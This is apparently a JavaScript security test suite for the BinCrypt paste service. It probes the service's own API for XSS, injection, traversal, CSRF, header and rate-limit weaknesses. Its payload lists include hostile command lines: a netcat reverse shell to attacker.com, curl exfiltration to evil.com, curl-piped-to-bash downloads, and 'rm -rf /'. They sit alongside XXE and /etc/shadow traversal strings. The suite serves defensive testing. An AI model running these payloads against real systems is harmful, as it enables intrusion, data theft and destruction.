// BinCrypt Security Test Suite
// Comprehensive security vulnerability assessment

class SecurityTestSuite {
    constructor(baseUrl = 'http://localhost:8080') {
        this.baseUrl = baseUrl;
        this.recorder = new TestRecorder();
        this.vulnerabilities = [];
        this.criticalIssues = [];
    }

    async runAllTests() {
        console.log('🛡️ Starting Security Test Suite...');
        
        try {
            await this.testInputValidation();
            await this.testXSSPrevention();
            await this.testSQLInjectionPrevention();
            await this.testCommandInjectionPrevention();
            await this.testDirectoryTraversal();
            await this.testCSRFProtection();
            await this.testRateLimiting();
            await this.testEncryptionSecurity();
            await this.testPasswordSecurity();
            await this.testSessionSecurity();
            await this.testDataExposure();
            await this.testHTTPSecurity();
            await this.testContentSecurityPolicy();
            await this.testAuthenticationBypass();
            await this.testPrivilegeEscalation();
            await this.testDenialOfService();
            
            console.log('✅ Security Test Suite completed');
            this.generateSecurityReport();
            return this.recorder.getSummary();
            
        } catch (error) {
            console.error('💥 Security Test Suite error:', error);
            throw error;
        }
    }

    async testInputValidation() {
        console.log('🔍 Testing input validation...');
        
        const maliciousInputs = [
            // XSS payloads
            '<script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '\'); alert("XSS"); //',
            
            // SQL Injection
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM passwords--",
            
            // Command Injection
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(whoami)",
            
            // Path Traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            
            // LDAP Injection
            "*)(uid=*))(|(uid=*",
            "*)(objectClass=*",
            
            // XML Injection
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
            
            // NoSQL Injection
            "'; return 1 == 1; //",
            "1; return true; var x='",
            
            // Header Injection
            "\\r\\nX-Injected-Header: injected",
            "\\n\\rSet-Cookie: admin=true"
        ];

        for (const input of maliciousInputs) {
            await this.testInputInPasteCreation(input);
            await this.testInputInURLPath(input);
        }

        // Test oversized inputs
        const oversizedInputs = [
            'A'.repeat(1048576), // 1MB
            'A'.repeat(10485760), // 10MB
            JSON.stringify({data: 'A'.repeat(524288)}) // Large JSON
        ];

        for (const oversized of oversizedInputs) {
            await this.testOversizedInput(oversized);
        }
    }

    async testInputInPasteCreation(maliciousInput) {
        try {
            const response = await fetch(`${this.baseUrl}/api/paste`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    ciphertext: btoa(maliciousInput), // base64 encode the malicious input
                    expiry_seconds: 3600
                })
            });

            // Server should either accept it (since it's encrypted) or reject it safely
            if (response.ok) {
                const data = await response.json();
                // Try to retrieve and see if it's properly handled
                const viewResponse = await fetch(`${this.baseUrl}/p/${data.id}`);
                const html = await viewResponse.text();
                
                // Check if malicious content is properly escaped in HTML
                if (html.includes('<script>') && !html.includes('&lt;script&gt;')) {
                    this.addVulnerability('XSS in Paste Display', 'HIGH', {
                        input: maliciousInput,
                        pasteId: data.id
                    });
                }
            }
            
            this.recorder.record(`Input Validation - Paste Creation (${maliciousInput.substring(0, 20)}...)`, 'PASS');
            
        } catch (error) {
            this.recorder.record(`Input Validation - Paste Creation (${maliciousInput.substring(0, 20)}...)`, 'FAIL', {
                error: error.message
            });
        }
    }

    async testInputInURLPath(maliciousInput) {
        try {
            const encodedInput = encodeURIComponent(maliciousInput);
            const response = await fetch(`${this.baseUrl}/p/${encodedInput}`);
            
            // Should return 404 or handle gracefully
            if (response.status === 200) {
                const html = await response.text();
                if (html.includes(maliciousInput) && !html.includes('&lt;')) {
                    this.addVulnerability('Path Injection', 'HIGH', {
                        input: maliciousInput,
                        response: html.substring(0, 200)
                    });
                }
            }
            
            this.recorder.record(`Input Validation - URL Path (${maliciousInput.substring(0, 20)}...)`, 'PASS');
            
        } catch (error) {
            this.recorder.record(`Input Validation - URL Path (${maliciousInput.substring(0, 20)}...)`, 'FAIL', {
                error: error.message
            });
        }
    }

    async testOversizedInput(oversizedInput) {
        try {
            const response = await fetch(`${this.baseUrl}/api/paste`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    ciphertext: oversizedInput,
                    expiry_seconds: 3600
                })
            });

            if (response.status === 400 || response.status === 413) {
                this.recorder.record(`Oversized Input Protection (${(oversizedInput.length / 1024).toFixed(0)}KB)`, 'PASS');
            } else if (response.ok) {
                this.addVulnerability('DoS via Large Input', 'MEDIUM', {
                    size: oversizedInput.length,
                    message: 'Server accepted oversized input'
                });
                this.recorder.record(`Oversized Input Protection (${(oversizedInput.length / 1024).toFixed(0)}KB)`, 'FAIL');
            }
            
        } catch (error) {
            // Network errors with large payloads might be expected
            this.recorder.record(`Oversized Input Protection (${(oversizedInput.length / 1024).toFixed(0)}KB)`, 'WARNING', {
                error: error.message
            });
        }
    }

    async testXSSPrevention() {
        console.log('🚨 Testing XSS prevention...');
        
        const xssPayloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(`XSS`)"></iframe>',
            '<object data="javascript:alert(`XSS`)">',
            '<embed src="javascript:alert(`XSS`)">',
            '<form><button formaction="javascript:alert(`XSS`)">',
            '<input onfocus=alert("XSS") autofocus>',
            '<select onfocus=alert("XSS") autofocus>',
            '<textarea onfocus=alert("XSS") autofocus>',
            '<keygen onfocus=alert("XSS") autofocus>',
            '<video><source onerror="alert(`XSS`)">',
            '<audio src=x onerror=alert("XSS")>',
            '<details open ontoggle=alert("XSS")>',
            '<marquee onstart=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            "'><script>alert('XSS')</script>",
            '<script>eval(atob("YWxlcnQoIlhTUyIp"))</script>', // base64 encoded alert
        ];

        for (const payload of xssPayloads) {
            try {
                // Create paste with XSS payload
                const createResponse = await fetch(`${this.baseUrl}/api/paste`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        ciphertext: btoa(JSON.stringify({
                            content: payload,
                            metadata: { syntaxHighlight: false }
                        })),
                        expiry_seconds: 3600
                    })
                });

                if (createResponse.ok) {
                    const data = await createResponse.json();
                    const viewResponse = await fetch(`${this.baseUrl}/p/${data.id}`);
                    const html = await viewResponse.text();
                    
                    // Check for unescaped script tags or event handlers
                    const dangerous = [
                        /<script[^>]*>/i,
                        /javascript:/i,
                        /on\w+\s*=/i,
                        /<iframe/i,
                        /<object/i,
                        /<embed/i
                    ];

                    let vulnerable = false;
                    for (const pattern of dangerous) {
                        if (pattern.test(html) && !html.includes('&lt;')) {
                            vulnerable = true;
                            break;
                        }
                    }

                    if (vulnerable) {
                        this.addVulnerability('Stored XSS', 'CRITICAL', {
                            payload,
                            pasteId: data.id,
                            location: 'Paste content display'
                        });
                        this.recorder.record(`XSS Prevention (${payload.substring(0, 30)}...)`, 'FAIL');
                    } else {
                        this.recorder.record(`XSS Prevention (${payload.substring(0, 30)}...)`, 'PASS');
                    }
                }
            } catch (error) {
                this.recorder.record(`XSS Prevention (${payload.substring(0, 30)}...)`, 'ERROR', {
                    error: error.message
                });
            }
        }
    }

    async testSQLInjectionPrevention() {
        console.log('💉 Testing SQL injection prevention...');
        
        // Note: BinCrypt uses Cloud Storage, not SQL, but test anyway
        const sqlPayloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM passwords--",
            "1; DELETE FROM users; --",
            "'; INSERT INTO users VALUES ('hacker', 'pass'); --",
            "' OR 1=1#",
            "' AND 1=1--",
            "' OR 'a'='a",
            "1' AND (SELECT COUNT(*) FROM users) > 0--"
        ];

        for (const payload of sqlPayloads) {
            try {
                const response = await fetch(`${this.baseUrl}/api/paste`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        ciphertext: btoa(payload),
                        expiry_seconds: 3600
                    })
                });

                // Since BinCrypt doesn't use SQL, these should be handled normally
                this.recorder.record(`SQL Injection Prevention (${payload.substring(0, 20)}...)`, 'PASS', {
                    note: 'No SQL database in use'
                });
                
            } catch (error) {
                this.recorder.record(`SQL Injection Prevention (${payload.substring(0, 20)}...)`, 'ERROR', {
                    error: error.message
                });
            }
        }
    }

    async testCommandInjectionPrevention() {
        console.log('⚡ Testing command injection prevention...');
        
        const commandPayloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(whoami)",
            "; nc -e /bin/sh attacker.com 4444",
            "| curl http://evil.com/steal?data=",
            "&& wget http://malware.com/payload",
            "; python -c 'import os; os.system(\"rm -rf /\")'",
            "$(curl -s http://evil.com/script.sh | bash)"
        ];

        for (const payload of commandPayloads) {
            try {
                const response = await fetch(`${this.baseUrl}/api/paste`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        ciphertext: btoa(payload),
                        expiry_seconds: 3600
                    })
                });

                // Check response time - command injection might cause delays
                const startTime = performance.now();
                if (response.ok) {
                    await response.json();
                }
                const endTime = performance.now();
                const duration = endTime - startTime;

                if (duration > 5000) { // 5 second threshold
                    this.addVulnerability('Possible Command Injection', 'HIGH', {
                        payload,
                        responseTime: `${duration}ms`,
                        message: 'Unusually long response time'
                    });
                    this.recorder.record(`Command Injection (${payload.substring(0, 20)}...)`, 'WARNING');
                } else {
                    this.recorder.record(`Command Injection (${payload.substring(0, 20)}...)`, 'PASS');
                }
                
            } catch (error) {
                this.recorder.record(`Command Injection (${payload.substring(0, 20)}...)`, 'ERROR', {
                    error: error.message
                });
            }
        }
    }

    async testDirectoryTraversal() {
        console.log('📁 Testing directory traversal...');
        
        const traversalPayloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc//passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "../../../proc/self/environ",
            "../../../var/log/apache2/access.log",
            "../../../../etc/shadow"
        ];

        for (const payload of traversalPayloads) {
            try {
                // Test in URL path
                const response = await fetch(`${this.baseUrl}/p/${encodeURIComponent(payload)}`);
                
                if (response.ok) {
                    const content = await response.text();
                    
                    // Look for system file content indicators
                    const systemFileIndicators = [
                        'root:x:0:0:',
                        '[boot loader]',
                        'PATH=',
                        'USER=',
                        'apache',
                        'www-data'
                    ];

                    if (systemFileIndicators.some(indicator => content.includes(indicator))) {
                        this.addVulnerability('Directory Traversal', 'CRITICAL', {
                            payload,
                            evidence: content.substring(0, 200)
                        });
                        this.recorder.record(`Directory Traversal (${payload})`, 'FAIL');
                    } else {
                        this.recorder.record(`Directory Traversal (${payload})`, 'PASS');
                    }
                } else {
                    this.recorder.record(`Directory Traversal (${payload})`, 'PASS');
                }
                
            } catch (error) {
                this.recorder.record(`Directory Traversal (${payload})`, 'ERROR', {
                    error: error.message
                });
            }
        }
    }

    async testCSRFProtection() {
        console.log('🔒 Testing CSRF protection...');
        
        // Test if API endpoints require proper headers
        try {
            // Test without Origin header
            const response1 = await fetch(`${this.baseUrl}/api/paste`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    ciphertext: 'dGVzdA==',
                    expiry_seconds: 3600
                })
            });

            // Test with malicious Origin header
            const response2 = await fetch(`${this.baseUrl}/api/paste`, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json',
                    'Origin': 'https://evil.com'
                },
                body: JSON.stringify({
                    ciphertext: 'dGVzdA==',
                    expiry_seconds: 3600
                })
            });

            if (response1.ok && response2.ok) {
                this.addVulnerability('CSRF Vulnerability', 'MEDIUM', {
                    message: 'API accepts requests without CSRF protection'
                });
                this.recorder.record('CSRF Protection', 'WARNING', {
                    message: 'No apparent CSRF protection (may be acceptable for public API)'
                });
            } else {
                this.recorder.record('CSRF Protection', 'PASS');
            }
            
        } catch (error) {
            this.recorder.record('CSRF Protection', 'ERROR', {
                error: error.message
            });
        }
    }

    async testRateLimiting() {
        console.log('🚦 Testing rate limiting...');
        
        const requests = [];
        const requestCount = 50;
        
        // Send many requests quickly
        for (let i = 0; i < requestCount; i++) {
            requests.push(
                fetch(`${this.baseUrl}/api/paste`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        ciphertext: btoa(`rate-limit-test-${i}`),
                        expiry_seconds: 3600
                    })
                })
            );
        }

        try {
            const responses = await Promise.all(requests);
            const rateLimited = responses.filter(r => r.status === 429).length;
            const successful = responses.filter(r => r.ok).length;

            if (successful === requestCount) {
                this.addVulnerability('No Rate Limiting', 'LOW', {
                    message: 'API accepts unlimited requests',
                    successfulRequests: successful
                });
                this.recorder.record('Rate Limiting', 'WARNING', {
                    message: 'No rate limiting detected'
                });
            } else if (rateLimited > 0) {
                this.recorder.record('Rate Limiting', 'PASS', {
                    rateLimitedRequests: rateLimited,
                    successfulRequests: successful
                });
            } else {
                this.recorder.record('Rate Limiting', 'WARNING', {
                    message: 'Some requests failed but not due to rate limiting'
                });
            }
            
        } catch (error) {
            this.recorder.record('Rate Limiting', 'ERROR', {
                error: error.message
            });
        }
    }

    async testEncryptionSecurity() {
        console.log('🔐 Testing encryption security...');
        
        try {
            // Test if we can access encryption functions
            if (typeof encryptPaste === 'function' && typeof decryptPaste === 'function') {
                // Test weak passwords
                const weakPasswords = ['', '1', '123', 'password', 'admin'];
                
                for (const weakPassword of weakPasswords) {
                    try {
                        const encrypted = await encryptPaste('test content', weakPassword);
                        const decrypted = await decryptPaste(encrypted, weakPassword);
                        
                        if (decrypted === 'test content') {
                            this.recorder.record(`Weak Password Acceptance (${weakPassword || 'empty'})`, 'WARNING', {
                                message: 'Weak password was accepted'
                            });
                        }
                    } catch (error) {
                        // Expected for empty passwords
                        this.recorder.record(`Weak Password Rejection (${weakPassword || 'empty'})`, 'PASS');
                    }
                }

                // Test if same content with same password produces different ciphertext (nonce/salt)
                const content = 'test content for nonce check';
                const password = 'test-password';
                
                const encrypted1 = await encryptPaste(content, password);
                const encrypted2 = await encryptPaste(content, password);
                
                if (encrypted1 !== encrypted2) {
                    this.recorder.record('Encryption Nonce/Salt Usage', 'PASS', {
                        message: 'Different ciphertext for same input (proper nonce/salt usage)'
                    });
                } else {
                    this.addVulnerability('Deterministic Encryption', 'HIGH', {
                        message: 'Same input produces same ciphertext (no nonce/salt)'
                    });
                    this.recorder.record('Encryption Nonce/Salt Usage', 'FAIL');
                }

                // Test encryption algorithm strength
                if (window.crypto && window.crypto.subtle) {
                    this.recorder.record('Encryption Algorithm', 'PASS', {
                        message: 'Using Web Crypto API (AES-256-GCM expected)'
                    });
                } else {
                    this.addVulnerability('Weak Encryption', 'CRITICAL', {
                        message: 'Not using Web Crypto API for encryption'
                    });
                    this.recorder.record('Encryption Algorithm', 'FAIL');
                }
            } else {
                this.recorder.record('Encryption Function Access', 'SKIP', {
                    message: 'Encryption functions not accessible for testing'
                });
            }
            
        } catch (error) {
            this.recorder.record('Encryption Security', 'ERROR', {
                error: error.message
            });
        }
    }

    async testPasswordSecurity() {
        console.log('🔑 Testing password security...');
        
        // Test password hashing (for view passwords)
        if (typeof window !== 'undefined' && window.crypto && window.crypto.subtle) {
            try {
                // Test if password hashing is consistent
                const password = 'test-password';
                const encoder = new TextEncoder();
                const data = encoder.encode(password);
                const hash1 = await crypto.subtle.digest('SHA-256', data);
                const hash2 = await crypto.subtle.digest('SHA-256', data);
                
                const hash1String = btoa(String.fromCharCode(...new Uint8Array(hash1)));
                const hash2String = btoa(String.fromCharCode(...new Uint8Array(hash2)));
                
                if (hash1String === hash2String) {
                    this.recorder.record('Password Hashing Consistency', 'PASS');
                } else {
                    this.recorder.record('Password Hashing Consistency', 'FAIL');
                }

                // Test password strength requirements (client-side)
                const weakPasswords = ['', '1', '123', 'password', 'admin', 'qwerty'];
                
                for (const weak of weakPasswords) {
                    // This would need to access the password strength function from the app
                    // For now, just record that we should test it
                    this.recorder.record(`Password Strength Check (${weak || 'empty'})`, 'SKIP', {
                        message: 'Client-side password strength not directly testable'
                    });
                }
                
            } catch (error) {
                this.recorder.record('Password Security', 'ERROR', {
                    error: error.message
                });
            }
        }
    }

    async testSessionSecurity() {
        console.log('🍪 Testing session security...');
        
        // BinCrypt is stateless, but check for any session cookies
        const cookies = document.cookie;
        
        if (cookies) {
            const cookieList = cookies.split(';').map(c => c.trim());
            
            for (const cookie of cookieList) {
                const [name, value] = cookie.split('=');
                
                // Check for insecure session cookies
                if (name.toLowerCase().includes('session') || 
                    name.toLowerCase().includes('auth') ||
                    name.toLowerCase().includes('token')) {
                    
                    this.addVulnerability('Insecure Session Cookie', 'MEDIUM', {
                        cookieName: name,
                        message: 'Session cookie may not have secure flags'
                    });
                }
            }
            
            this.recorder.record('Session Cookie Security', 'WARNING', {
                cookieCount: cookieList.length,
                message: 'Found cookies - review security flags'
            });
        } else {
            this.recorder.record('Session Cookie Security', 'PASS', {
                message: 'No cookies found (stateless application)'
            });
        }
    }

    async testDataExposure() {
        console.log('👁️ Testing data exposure...');
        
        try {
            // Test if server exposes sensitive information in errors
            const sensitiveRequests = [
                '/api/paste/../../../etc/passwd',
                '/api/paste/../../config.json',
                '/api/../main.go',
                '/.env',
                '/config.json',
                '/debug/vars',
                '/debug/pprof',
                '/.git/config',
                '/admin',
                '/management',
                '/status',
                '/health'
            ];

            for (const path of sensitiveRequests) {
                try {
                    const response = await fetch(`${this.baseUrl}${path}`);
                    const content = await response.text();
                    
                    // Look for sensitive information in responses
                    const sensitivePatterns = [
                        /password/i,
                        /secret/i,
                        /token/i,
                        /key.*=/i,
                        /database/i,
                        /config/i,
                        /api.*key/i,
                        /connection.*string/i
                    ];

                    let exposedData = false;
                    for (const pattern of sensitivePatterns) {
                        if (pattern.test(content)) {
                            exposedData = true;
                            break;
                        }
                    }

                    if (exposedData && response.ok) {
                        this.addVulnerability('Information Disclosure', 'MEDIUM', {
                            path,
                            evidence: content.substring(0, 200)
                        });
                        this.recorder.record(`Data Exposure (${path})`, 'FAIL');
                    } else {
                        this.recorder.record(`Data Exposure (${path})`, 'PASS');
                    }
                    
                } catch (error) {
                    this.recorder.record(`Data Exposure (${path})`, 'PASS', {
                        message: 'Request failed as expected'
                    });
                }
            }
            
        } catch (error) {
            this.recorder.record('Data Exposure', 'ERROR', {
                error: error.message
            });
        }
    }

    async testHTTPSecurity() {
        console.log('🌐 Testing HTTP security...');
        
        try {
            const response = await fetch(`${this.baseUrl}/`);
            const headers = response.headers;
            
            // Check security headers
            const securityHeaders = [
                {
                    name: 'Strict-Transport-Security',
                    required: true,
                    pattern: /max-age=\d+/
                },
                {
                    name: 'Content-Security-Policy',
                    required: true,  
                    pattern: /default-src/
                },
                {
                    name: 'X-Content-Type-Options',
                    required: false,
                    pattern: /nosniff/
                },
                {
                    name: 'X-Frame-Options',
                    required: false,
                    pattern: /(DENY|SAMEORIGIN)/
                },
                {
                    name: 'X-XSS-Protection',
                    required: false,
                    pattern: /1; mode=block/
                },
                {
                    name: 'Referrer-Policy',
                    required: false,
                    pattern: /(strict-origin|no-referrer)/
                }
            ];

            for (const header of securityHeaders) {
                const headerValue = headers.get(header.name.toLowerCase());
                
                if (headerValue) {
                    if (header.pattern && !header.pattern.test(headerValue)) {
                        this.addVulnerability(`Weak ${header.name}`, 'LOW', {
                            headerValue,
                            message: 'Header present but may be misconfigured'
                        });
                        this.recorder.record(`HTTP Security - ${header.name}`, 'WARNING');
                    } else {
                        this.recorder.record(`HTTP Security - ${header.name}`, 'PASS');
                    }
                } else if (header.required) {
                    this.addVulnerability(`Missing ${header.name}`, 'MEDIUM', {
                        message: 'Required security header is missing'
                    });
                    this.recorder.record(`HTTP Security - ${header.name}`, 'FAIL');
                } else {
                    this.recorder.record(`HTTP Security - ${header.name}`, 'WARNING');
                }
            }
            
        } catch (error) {
            this.recorder.record('HTTP Security', 'ERROR', {
                error: error.message
            });
        }
    }

    async testContentSecurityPolicy() {
        console.log('🛡️ Testing Content Security Policy...');
        
        try {
            const response = await fetch(`${this.baseUrl}/`);
            const csp = response.headers.get('content-security-policy');
            
            if (csp) {
                // Check for common CSP weaknesses
                const weaknesses = [
                    {
                        pattern: /'unsafe-inline'/,
                        issue: 'Allows inline scripts/styles',
                        severity: 'MEDIUM'
                    },
                    {
                        pattern: /'unsafe-eval'/,
                        issue: 'Allows eval() and similar functions',
                        severity: 'HIGH'
                    },
                    {
                        pattern: /\*/,
                        issue: 'Uses wildcard (*) directive',
                        severity: 'MEDIUM'
                    },
                    {
                        pattern: /data:/,
                        issue: 'Allows data: URIs',
                        severity: 'LOW'
                    }
                ];

                let hasWeaknesses = false;
                for (const weakness of weaknesses) {
                    if (weakness.pattern.test(csp)) {
                        this.addVulnerability(`CSP Weakness: ${weakness.issue}`, weakness.severity, {
                            cspValue: csp
                        });
                        hasWeaknesses = true;
                    }
                }

                if (hasWeaknesses) {
                    this.recorder.record('Content Security Policy', 'WARNING', {
                        csp: csp.substring(0, 100) + '...'
                    });
                } else {
                    this.recorder.record('Content Security Policy', 'PASS');
                }
            } else {
                this.addVulnerability('Missing Content Security Policy', 'MEDIUM', {
                    message: 'No CSP header found'
                });
                this.recorder.record('Content Security Policy', 'FAIL');
            }
            
        } catch (error) {
            this.recorder.record('Content Security Policy', 'ERROR', {
                error: error.message
            });
        }
    }

    async testAuthenticationBypass() {
        console.log('🔓 Testing authentication bypass...');
        
        // BinCrypt doesn't have traditional authentication, but test access controls
        try {
            // Test if we can access admin/management endpoints
            const adminPaths = [
                '/admin',
                '/management',
                '/dashboard',
                '/config',
                '/settings',
                '/users',
                '/logs',
                '/debug'
            ];

            for (const path of adminPaths) {
                try {
                    const response = await fetch(`${this.baseUrl}${path}`);
                    
                    if (response.ok) {
                        const content = await response.text();
                        if (content.includes('admin') || content.includes('dashboard')) {
                            this.addVulnerability('Exposed Admin Interface', 'HIGH', {
                                path,
                                evidence: content.substring(0, 200)
                            });
                            this.recorder.record(`Auth Bypass (${path})`, 'FAIL');
                        } else {
                            this.recorder.record(`Auth Bypass (${path})`, 'PASS');
                        }
                    } else {
                        this.recorder.record(`Auth Bypass (${path})`, 'PASS');
                    }
                    
                } catch (error) {
                    this.recorder.record(`Auth Bypass (${path})`, 'PASS');
                }
            }
            
        } catch (error) {
            this.recorder.record('Authentication Bypass', 'ERROR', {
                error: error.message
            });
        }
    }

    async testPrivilegeEscalation() {
        console.log('⬆️ Testing privilege escalation...');
        
        // Test if we can access privileged functions
        try {
            // Test payment webhook without proper authentication
            const response = await fetch(`${this.baseUrl}/api/payhook`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    id: 'fake-invoice',
                    status: 'paid',
                    amount: 5.00
                })
            });

            if (response.ok) {
                this.addVulnerability('Unauthenticated Webhook Access', 'HIGH', {
                    message: 'Payment webhook accepts unauthenticated requests'
                });
                this.recorder.record('Privilege Escalation - Webhook', 'FAIL');
            } else {
                this.recorder.record('Privilege Escalation - Webhook', 'PASS');
            }
            
        } catch (error) {
            this.recorder.record('Privilege Escalation', 'ERROR', {
                error: error.message
            });
        }
    }

    async testDenialOfService() {
        console.log('💥 Testing denial of service...');
        
        try {
            // Test resource exhaustion
            const largePayload = 'A'.repeat(10485760); // 10MB
            
            const response = await fetch(`${this.baseUrl}/api/paste`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    ciphertext: largePayload,
                    expiry_seconds: 3600
                })
            });

            if (response.ok) {
                this.addVulnerability('DoS via Large Payloads', 'MEDIUM', {
                    payloadSize: '10MB',
                    message: 'Server accepts very large payloads'
                });
                this.recorder.record('DoS Protection - Large Payload', 'WARNING');
            } else {
                this.recorder.record('DoS Protection - Large Payload', 'PASS');
            }

            // Test slowloris-style attack (keep connections open)
            const slowConnections = [];
            for (let i = 0; i < 10; i++) {
                slowConnections.push(
                    fetch(`${this.baseUrl}/api/paste`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            ciphertext: 'slow-connection-test',
                            expiry_seconds: 1
                        })
                    })
                );
            }

            const results = await Promise.all(slowConnections);
            const successful = results.filter(r => r.ok).length;
            
            if (successful < 5) {
                this.recorder.record('DoS Protection - Connection Limit', 'PASS');
            } else {
                this.recorder.record('DoS Protection - Connection Limit', 'WARNING', {
                    successfulConnections: successful
                });
            }
            
        } catch (error) {
            this.recorder.record('Denial of Service', 'ERROR', {
                error: error.message
            });
        }
    }

    addVulnerability(name, severity, details) {
        const vulnerability = {
            name,
            severity,
            details,
            timestamp: new Date().toISOString()
        };
        
        this.vulnerabilities.push(vulnerability);
        
        if (severity === 'CRITICAL' || severity === 'HIGH') {
            this.criticalIssues.push(vulnerability);
        }
        
        console.warn(`🚨 ${severity} Vulnerability: ${name}`, details);
    }

    generateSecurityReport() {
        const summary = {
            totalTests: this.recorder.results.length,
            vulnerabilities: this.vulnerabilities.length,
            criticalIssues: this.criticalIssues.length,
            severityBreakdown: {
                CRITICAL: this.vulnerabilities.filter(v => v.severity === 'CRITICAL').length,
                HIGH: this.vulnerabilities.filter(v => v.severity === 'HIGH').length,
                MEDIUM: this.vulnerabilities.filter(v => v.severity === 'MEDIUM').length,
                LOW: this.vulnerabilities.filter(v => v.severity === 'LOW').length
            }
        };

        console.log('🛡️ Security Test Summary:', summary);
        return summary;
    }

    getResults() {
        return {
            summary: this.recorder.getSummary(),
            vulnerabilities: this.vulnerabilities,
            criticalIssues: this.criticalIssues,
            testResults: this.recorder.results
        };
    }
}

// Export for both browser and Node.js
if (typeof window !== 'undefined') {
    window.SecurityTestSuite = SecurityTestSuite;
}

if (typeof module !== 'undefined' && module.exports) {
    module.exports = SecurityTestSuite;
}